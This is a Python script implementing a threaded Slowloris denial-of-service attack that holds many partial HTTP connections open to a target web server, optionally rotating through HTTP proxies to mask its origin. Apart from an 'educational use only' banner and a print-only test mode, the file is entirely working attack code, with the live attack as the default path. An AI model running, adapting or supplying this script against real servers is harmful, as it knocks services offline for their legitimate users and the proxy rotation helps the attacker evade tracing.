import socket
import threading
import time
import random
import socks

def slowloris(target, port=80, threads=10, test_mode=False, duration=10, proxies=None):
    print("[!] Slowloris Attack - For educational use only!")
    stop_time = time.time() + duration
    def attack():
        proxy = None
        if proxies:
            proxy_addr = random.choice(proxies)
            host, p = proxy_addr.split(":")
            s = socks.socksocket()
            s.set_proxy(socks.HTTP, host, int(p))
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if test_mode:
            print(f"[TEST] Would open and hold HTTP connection to {target}:{port} via {proxy_addr if proxies else 'no proxy'}")
            time.sleep(duration)
            return
        try:
            s.settimeout(4)
            s.connect((target, port))
            s.send(f"GET /?{time.time()} HTTP/1.1\r\n".encode('utf-8'))
            s.send(f"Host: {target}\r\n".encode('utf-8'))
            while time.time() < stop_time:
                try:
                    s.send(b"X-a: b\r\n")
                    time.sleep(10)
                except Exception:
                    break
            s.close()
        except Exception:
            pass
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=attack)
        t.start()
        thread_list.append(t)
    for t in thread_list:
        t.join()
    print("[+] Slowloris attack completed.")
